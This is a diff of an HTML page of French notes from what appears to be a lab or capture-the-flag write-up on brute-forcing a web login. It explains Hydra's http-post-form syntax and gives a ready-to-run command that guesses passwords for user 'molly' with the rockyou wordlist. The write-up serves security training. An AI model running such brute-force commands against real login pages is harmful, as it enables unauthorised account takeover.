@@ -355,7 +355,8 @@
 <li>On envoie la requête pour ensuite récupérer le messager d'erreur, exemple : <code>Your username or password is incorrect.</code></li>
 </ul>
 <h4 id="etape-2-lancer-lattaque-avec-les-infos-regroupees">Etape 2 : Lancer l'attaque avec les infos regroupées</h4>
-<pre><code class="language-bash">hydra -l pseudoAtester -P /usr/share/wordlists/rockyou.txt 10.10.243.64 http-post-form &quot;/login:=^USER^&amp;password=^PASS^:Your username or password is incorrect.&quot;
+<p>L'idée c'est de faire <code>login:</code> et de recopier la structure de la requête de connexion en remplaçant l'endroit où il y a l'username et le mdp par <code>^USER^</code> et <code>^PASS^</code> respectivement. On rajoute ensuite <code>:</code> suivie du message d'erreur à la fin.</p>
+<pre><code class="language-bash">hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.243.64 http-post-form &quot;/login:username=^USER^&amp;password=^PASS^:Your username or password is incorrect.&quot; -V
 </code></pre>
               
             </div>
